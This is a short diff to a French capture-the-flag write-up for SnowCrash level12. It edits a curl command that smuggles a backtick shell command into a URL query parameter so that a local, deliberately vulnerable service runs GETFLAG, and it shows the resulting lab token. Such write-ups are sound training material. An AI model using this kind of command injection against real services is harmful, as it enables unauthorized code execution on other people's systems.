@@ -108,7 +108,7 @@ L'avantage c'est que c'est dans le script que l'on maitrise la sortie de getflag
 
 Maintenant la commande curl ne passe pas pas les erreur de apache et on a pas besoins de coder 'url'
 ```shell
-level12@SnowCrash:~$ curl '127.0.0.1:4646?x=`/*/*/GETFLAG`'
+level12@SnowCrash:~$ curl '127.0.0.1:4646?x=`/*/GETFLAG`'
 
 level12@SnowCrash:~$ cat /tmp/token
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
